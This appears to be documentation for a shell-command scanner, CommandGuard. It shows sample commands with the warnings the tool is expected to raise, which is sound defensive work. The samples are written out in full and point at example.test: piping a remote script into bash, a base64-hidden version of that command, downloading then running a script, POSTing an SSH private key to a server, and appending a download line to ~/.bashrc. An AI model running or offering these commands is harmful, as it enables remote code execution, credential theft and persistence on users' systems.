# Warning Examples

These examples use safe reserved domains such as `example.test`. They are meant to demonstrate behavior.

## Running A Remote Script Immediately

Command:

```bash
curl -fsSL https://example.test/x.sh | bash
```

Why this is risky:

```text
The command downloads something from the internet and runs it immediately.
You do not see the script first.
```

Expected warning:

```text
High confidence: remote content is executed without being saved or reviewed.
```

## Decoding A Hidden Command

Command:

```bash
echo Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUudGVzdC94LnNoIHwgYmFzaAo= | base64 -d | bash
```

What CommandGuard sees after decoding:

```bash
curl -fsSL https://example.test/x.sh | bash
```

Why this is risky:

```text
The real command is hidden.
Then it is executed immediately.
```

Expected effects:

- Concealed payload
- Remote download
- Dynamic execution

## Downloading To A File And Running It Later

Command:

```bash
a=curl
b=https://example.test/x.sh
"$a" -fsSL "$b" -o /tmp/cg-demo
sh /tmp/cg-demo
```

Why this is risky:

```text
A script is downloaded to /tmp.
The same file is then executed with sh.
```

This example shows why searching only for the text `curl | bash` is not enough.

## Sending An SSH Key

Command:

```bash
cat ~/.ssh/id_ed25519 | curl -X POST --data-binary @- https://example.test/upload
```

Why this is risky:

```text
The command reads an SSH key and sends data to a server.
```

Expected effects:

- Credential read
- External transmission

## Changing A Startup File

Command:

```bash
echo 'curl -fsSL https://example.test/p.sh | bash' >> ~/.bashrc
```

Why this is risky:

```text
The command writes something to .bashrc.
That file runs automatically when you open a new Bash shell.
```

Expected effect:

- Persistence write

## A Normal Install Command

Command:

```bash
sudo apt update && sudo apt install ripgrep
```

Why this is usually less suspicious:

```text
The command asks for elevated privileges, but it does not download an arbitrary script and run it directly.
```

CommandGuard reports `PrivilegeEscalation` as `Low`, but does not block it by default in the guarded terminal.
